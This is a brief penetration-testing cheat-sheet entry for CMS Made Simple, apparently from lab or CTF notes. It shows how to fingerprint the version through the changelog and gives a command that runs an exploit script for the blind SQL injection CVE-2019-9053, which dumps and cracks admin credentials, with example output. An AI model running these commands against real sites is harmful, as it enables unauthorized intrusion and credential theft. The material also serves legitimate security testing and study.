# CMS Made Simple

**What it is:** Lightweight CMS for small websites. Known for a blind SQL injection vulnerability in versions below 2.2.10 that dumps admin credentials.

**Default ports:** 80, 443

**Vuln research:**
- [CMS Made Simple Security](https://www.cmsmadesimple.org/security-notifications/)
- [SearchSploit: `searchsploit cms made simple`](https://www.exploit-db.com/search?q=cms+made+simple)

---


### Identify version

Check /doc/CHANGELOG.txt — Version determines SQLi availability

```bash
curl -s http://$IP/doc/CHANGELOG.txt | head -10
```

---

### SQLi (CVE-2019-9053)

Blind SQLi on CMS Made Simple < 2.2.10 — Dumps admin credentials

```bash
python3 cmsms_sqli.py -u http://$IP/ --crack -w /usr/share/wordlists/rockyou.txt
```

<details>
<summary>Example Output</summary>

```
[+] Salt for password found: xxxxxxxx
[+] Username found: admin
[+] Email found: admin@site.com
[+] Password found: SuperSecret
```
</details>

---
